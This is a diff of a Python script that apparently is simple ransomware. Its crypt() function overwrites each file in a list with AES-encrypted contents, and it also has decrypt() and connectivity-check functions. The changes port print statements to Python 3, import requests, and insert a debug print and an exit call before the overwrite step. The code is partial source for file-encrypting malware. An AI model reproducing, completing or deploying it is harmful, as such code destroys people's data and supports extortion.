@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # coding: utf-8
 
-import os, sys, fnmatch, base64, urllib, webbrowser, socket
+import os, sys, fnmatch, base64, urllib, webbrowser, socket, requests
 from Crypto import Random
 from Crypto.Cipher import AES
 
@@ -39,13 +39,15 @@ def crypt(password, files):
     for path in files:
         ifp = open(path, 'rb')
         data = ifp.read()
+        print(data)
         ifp.close()
+        exit("end")
         try:
             ofp = open(path, 'wb')
             ofp.write(aes.encrypt(data))
             ofp.close()
         except ValueError:
-            print '%s operation failed, skipping %s' % (mode, path)
+            print('%s operation failed, skipping %s' % (mode, path))
 
 
 def decrypt(password, files):
@@ -60,7 +62,7 @@ def decrypt(password, files):
             ofp.write(aes.decrypt(data))
             ofp.close()
         except ValueError:
-            print '%s operation failed, skipping %s' % (mode, path)
+            print('%s operation failed, skipping %s' % (mode, path))
 
 
 def isConnected():
